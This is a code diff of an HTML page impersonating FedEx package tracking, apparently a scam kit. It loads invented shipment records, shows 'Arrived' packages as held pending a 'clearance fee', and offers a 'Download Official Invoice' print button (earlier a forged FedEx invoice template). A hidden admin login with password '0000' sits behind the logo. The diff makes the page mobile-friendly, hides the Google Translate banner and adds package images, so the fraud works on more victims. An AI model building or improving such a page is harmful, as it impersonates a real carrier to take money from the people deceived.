@@ -2,95 +2,122 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Fedex | Track Your Package</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fedex | Global Tracking</title>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
     <style>
-        :root { --purple: #4D148C; --orange: #FF6200; }
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; background: #f7f7f7; }
-        .header { background: var(--purple); padding: 15px; color: white; display: flex; justify-content: space-between; align-items: center; }
-        .logo { font-size: 28px; font-weight: 800; cursor: pointer; }
-        .container { max-width: 600px; margin: 50px auto; background: white; padding: 40px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: var(--orange); color: white; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        #result { display: none; margin-top: 30px; border-top: 2px solid #eee; padding-top: 20px; }
-        .status-badge { padding: 5px 15px; border-radius: 20px; color: white; font-weight: bold; display: inline-block; margin-bottom: 10px; }
+        :root { --fedex-purple: #4D148C; --fedex-orange: #FF6200; --bg: #f2f2f2; }
+        body { font-family: 'Roboto', Helvetica, Arial, sans-serif; margin: 0; background: var(--bg); color: #333; }
         
-        /* Realistic Invoice CSS (Hidden until print) */
-        #invoice-template { display: none; }
-        @media print {
-            body * { visibility: hidden; }
-            #invoice-template, #invoice-template * { visibility: visible; }
-            #invoice-template { position: absolute; left: 0; top: 0; width: 100%; padding: 40px; }
-        }
+        /* Mobile Header */
+        .navbar { background: var(--fedex-purple); padding: 15px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .logo { font-size: 22px; font-weight: 900; color: white; cursor: pointer; letter-spacing: -1px; }
+        .orange-text { color: var(--fedex-orange); }
+
+        /* Mobile Card Container */
+        .wrapper { padding: 20px; max-width: 450px; margin: auto; }
+        .card { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; }
+        
+        h2 { font-size: 1.4rem; margin-bottom: 20px; color: var(--fedex-purple); }
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { font-size: 12px; font-weight: bold; color: #666; margin-left: 5px; }
+        
+        input { width: 100%; padding: 15px; border: 1.5px solid #ddd; border-radius: 8px; font-size: 16px; margin-top: 5px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--fedex-purple); }
+        
+        .btn-track { background: var(--fedex-orange); color: white; width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+
+        /* Result Section */
+        #result { display: none; margin-top: 25px; text-align: left; border-top: 1px solid #eee; padding-top: 20px; }
+        .status-box { padding: 15px; border-radius: 8px; margin-bottom: 15px; font-weight: bold; font-size: 14px; text-align: center; }
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; border-bottom: 1px solid #fafafa; padding-bottom: 5px; }
+        .info-row span { color: #666; }
+        .package-img { width: 100%; border-radius: 8px; margin-top: 15px; border: 1px solid #eee; }
+
+        /* Invoice Button */
+        .btn-invoice { background: #333; color: white; width: 100%; padding: 12px; border: none; border-radius: 6px; margin-top: 15px; cursor: pointer; }
+
+        /* Hide Google Translate Bar */
+        .goog-te-banner-frame.skiptranslate { display: none !important; }
+        body { top: 0px !important; }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="logo" onclick="adminLogin()">Fed<span style="color:var(--orange)">ex</span></div>
+<div id="google_translate_element" style="display:none"></div>
+
+<div class="navbar">
+    <div class="logo" onclick="adminAuth()">Fed<span class="orange-text">ex</span></div>
+    <div style="color:white; font-size: 12px;">Express Mobile</div>
 </div>
 
-<div class="container">
-    <h2>Track your shipment</h2>
-    <input type="text" id="trackCode" placeholder="Enter Tracking ID">
-    <button onclick="fetchTracking()">TRACK</button>
-
-    <div id="result">
-        <div id="badge" class="status-badge"></div>
-        <h3 id="display-name"></h3>
-        <p><strong>Route:</strong> <span id="display-from"></span> → <span id="display-to"></span></p>
-        <p><strong>Est. Delivery:</strong> <span id="display-eta"></span></p>
-        <div id="package-view"></div>
-        <div id="payment-area" style="display:none; background: #fff3cd; padding: 15px; border-radius: 5px; margin-top: 15px;">
-            <p style="color: #856404;"><b>Action Required:</b> A clearance fee of $<span id="display-fee"></span> is required.</p>
-            <button onclick="window.print()" style="background: #333;">Download Official Invoice</button>
+<div class="wrapper">
+    <div class="card">
+        <h2>Track Your Package</h2>
+        <div class="input-group">
+            <label>ENTER TRACKING NUMBER</label>
+            <input type="text" id="trackCode" placeholder="Ex: 1234 5678 9012">
         </div>
-    </div>
-</div>
+        <button class="btn-track" onclick="track()">Track Shipment</button>
 
-<div id="invoice-template">
-    <div style="border: 2px solid #000; padding: 20px;">
-        <h1 style="color:#4D148C">Fedex Express Invoice</h1>
-        <hr>
-        <p><strong>Tracking ID:</strong> <span id="inv-id"></span></p>
-        <p><strong>Recipient:</strong> <span id="inv-name"></span></p>
-        <p><strong>Total Charges:</strong> $<span id="inv-fee"></span></p>
-        <p><strong>Status:</strong> Arrived (Pending Payment)</p>
-        <div style="margin-top: 50px; border-top: 1px solid #ccc; padding-top: 10px;">
-            <small>This is a computer-generated document. Fedex Express © 2026</small>
+        <div id="result">
+            <div id="status-badge" class="status-box"></div>
+            <div class="info-row"><span>Recipient:</span> <b id="r-name"></b></div>
+            <div class="info-row"><span>From:</span> <b id="r-from"></b></div>
+            <div class="info-row"><span>To:</span> <b id="r-to"></b></div>
+            <div class="info-row"><span>Updated:</span> <b id="r-date"></b></div>
+            
+            <div id="img-container"></div>
+
+            <div id="payment-needed" style="display:none; margin-top: 20px; background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 5px solid #ffc107;">
+                <p style="margin:0; font-size: 13px; color: #856404;"><b>Attention:</b> Package held at hub. Clearance fee of <b>$<span id="r-fee"></span></b> is required for final delivery.</p>
+                <button class="btn-invoice" onclick="window.print()">Download Official Invoice</button>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
-    async function fetchTracking() {
-        const code = document.getElementById('trackCode').value;
-        const response = await fetch('data.json?nocache=' + new Date().getTime());
-        const data = await response.json();
-        const ship = data[code];
-
-        if(ship) {
-            document.getElementById('result').style.display = 'block';
-            document.getElementById('display-name').innerText = ship.name;
-            document.getElementById('display-from').innerText = ship.origin;
-            document.getElementById('display-to').innerText = ship.dest;
-            document.getElementById('display-eta').innerText = ship.eta;
-            document.getElementById('badge').innerText = ship.status;
-            document.getElementById('badge').style.background = ship.status === 'Arrived' ? 'green' : 'orange';
-            
-            if(ship.status === 'Arrived (Payment needed)') {
-                document.getElementById('payment-area').style.display = 'block';
-                document.getElementById('display-fee').innerText = ship.fee;
-                document.getElementById('inv-id').innerText = code;
-                document.getElementById('inv-name').innerText = ship.name;
-                document.getElementById('inv-fee').innerText = ship.fee;
-            }
-        } else { alert("Code not found."); }
+    // Initialize Google Translate
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
     }
 
-    function adminLogin() {
-        if(prompt("Password:") === "0000") {
-            const tok = prompt("Token:");
-            window.location.href = `admin.html?t=${tok}`;
+    async function track() {
+        const code = document.getElementById('trackCode').value;
+        const res = await fetch('data.json?v=' + Date.now());
+        const data = await res.json();
+        const s = data[code];
+
+        if(s) {
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('r-name').innerText = s.name;
+            document.getElementById('r-from').innerText = s.origin;
+            document.getElementById('r-to').innerText = s.dest;
+            document.getElementById('r-date').innerText = s.updated;
+            
+            const badge = document.getElementById('status-badge');
+            badge.innerText = s.status;
+            badge.style.background = s.status.includes("Arrived") ? "#d4edda" : "#e2e3e5";
+            badge.style.color = s.status.includes("Arrived") ? "#155724" : "#383d41";
+
+            if(s.image) {
+                document.getElementById('img-container').innerHTML = `<img src="${s.image}" class="package-img">`;
+            }
+
+            if(s.status.includes("Arrived")) {
+                document.getElementById('payment-needed').style.display = 'block';
+                document.getElementById('r-fee').innerText = s.fee;
+            }
+        } else {
+            alert("Invalid Tracking Code");
+        }
+    }
+
+    function adminAuth() {
+        if(prompt("Pass:") === "0000") {
+            const t = prompt("Token:");
+            window.location.href = "admin.html?token=" + t;
         }
     }
 </script>
